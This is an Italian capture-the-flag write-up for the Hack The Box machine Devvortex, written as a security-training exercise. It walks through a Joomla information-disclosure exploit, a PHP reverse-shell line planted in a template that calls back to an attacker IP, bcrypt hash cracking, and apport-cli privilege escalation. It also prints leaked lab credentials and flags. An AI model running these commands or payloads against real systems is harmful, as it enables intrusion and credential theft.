# Devvortex — Linux — Easy

**IP Target:** `10.129.229.146`  
**User flag:** `e2302e9d8302d97c479136842ba111cd`  
**Root flag:** `46e82443537bf2b252e74dc87527d8f1`

---

## Recon

### Nmap

```bash
nmap -p- --min-rate 10000 -oA nmap_allport 10.129.229.146
nmap -p 22,80 -sV -sC -oA nmap_detailed 10.129.229.146
```

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 8.2p1 Ubuntu 4ubuntu0.9|
|80|HTTP|nginx 1.18.0|

Il redirect HTTP porta a `devvortex.htb` — aggiunto in `/etc/hosts`.

---

## Web Enumeration

### Sito principale — devvortex.htb

![[Screenshot_2026-04-21_at_21-30-16_DevVortex.png]]

Sito statico, niente di interessante in superficie. Si procede con subdomain enumeration.

### Subdomain Bruteforce

```bash
ffuf -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 9265
```

Trovato: `dev.devvortex.htb` — aggiunto in `/etc/hosts`.

![[Screenshot_2026-04-21_at_22-06-38_Devvortex.png]]

### Directory Bruteforce su dev.devvortex.htb

```bash
gobuster dir -u http://dev.devvortex.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
```

Risultati rilevanti:

|Path|Status|
|---|---|
|/administrator|301|
|/api|301|
|/templates|301|
|/plugins|301|

La presenza di `/api` è caratteristica di **Joomla 4.x** — confermato anche dall'header `X-Powered-By: JoomlaAPI/1.0`.

---

## Foothold

### CVE-2023-23752 — Joomla Unauthenticated Information Disclosure

Joomla 4.2.x espone un endpoint API vulnerabile che, aggiungendo `?public=true`, bypassa il controllo di accesso e restituisce dati sensibili senza autenticazione.

```bash
searchsploit -m php/webapps/51334.py
gem install httpx docopt paint
ruby 51334.py http://dev.devvortex.htb
```

Output:

```
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Database info
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
```

|Username|Password|Source|
|---|---|---|
|lewis|P4ntherg0t1n5r3c0n##|CVE-2023-23752|

### Accesso al pannello admin Joomla

Login su `http://dev.devvortex.htb/administrator` con `lewis:P4ntherg0t1n5r3c0n##`.

### RCE via Template Editor

Navigando in `System → Administrator Templates → Atum → login.php`, è possibile modificare direttamente il PHP del template. Aggiunta la riga:

```php
system('bash -i >& /dev/tcp/10.10.15.211/4444 0>&1');
```

![[Screenshot_2026-04-21_22-56-52.png]]

Con listener attivo:

```bash
nc -lvnp 4444
```

Visitando `http://dev.devvortex.htb/administrator/templates/atum/login.php` si ottiene la shell come `www-data`.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
```

---

## Lateral Movement — www-data → logan

### Dump credenziali da MySQL

```bash
mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla
```

```sql
SELECT username, password FROM sd4fg_users;
```

![[Screenshot_2026-04-22_10-41-07.png]]

```
lewis | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
logan | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

### Hashcat — bcrypt crack

```bash
echo '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' > hash.txt
hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

![[Screenshot_2026-04-22_10-46-27.png]]

Risultato: `logan:tequieromucho`

### SSH come logan

```bash
ssh logan@devvortex.htb
```

**User flag:** `e2302e9d8302d97c479136842ba111cd`

---

## Privilege Escalation — logan → root

### sudo -l

```
User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

### CVE-2023-1326 — apport-cli Privilege Escalation

`apport-cli` versione 2.26.0 e precedenti, quando eseguito con `sudo`, non droppa i privilegi prima di aprire il pager (`less`). Tramite la shell escape di `less` è possibile eseguire comandi come root.

```bash
sudo /usr/bin/apport-cli -f
```

Seguire il wizard scegliendo qualsiasi categoria → al prompt finale scegliere **V** (View report) → si apre `less` con privilegi root → digitare:

```
!/bin/bash
```

![[Screenshot_2026-04-22_10-58-56.png]]

Shell ottenuta come `root`.

**Root flag:** `46e82443537bf2b252e74dc87527d8f1`

---

## Loot

|Username|Password|Hash|Source|
|---|---|---|---|
|lewis|P4ntherg0t1n5r3c0n##|$2y$10$6V52x...|CVE-2023-23752|
|logan|tequieromucho|$2y$10$IT4k5...|MySQL dump|

---

## Lessons Learned

1. **Enumera i subdomain sempre** — `dev.devvortex.htb` era invisibile dal sito principale ma esponeva l'intera superficie di attacco.
2. **La directory `/api` è un indicatore di versione** — su Joomla 4.x è sempre presente e in questo caso esposta al CVE-2023-23752.
3. **`searchsploit` va letto con attenzione** — lo script era Ruby ma nominato `.py`; leggere il file type prima di eseguire evita perdite di tempo.
4. **Il Template Editor di Joomla è un vettore RCE classico** — ma occhio al template corretto: `Administrator Templates (Atum)` per `/administrator/`, non `Site Templates (Cassiopeia)`.
5. **bcrypt è lento ma hashcat con rockyou rimane efficace** — la password `tequieromucho` craccata in ~10 secondi con GPU.
6. **`sudo` + pager = GTFOBins** — qualsiasi binario che apre un pager come `less` con privilegi elevati è potenzialmente sfruttabile con `!command`.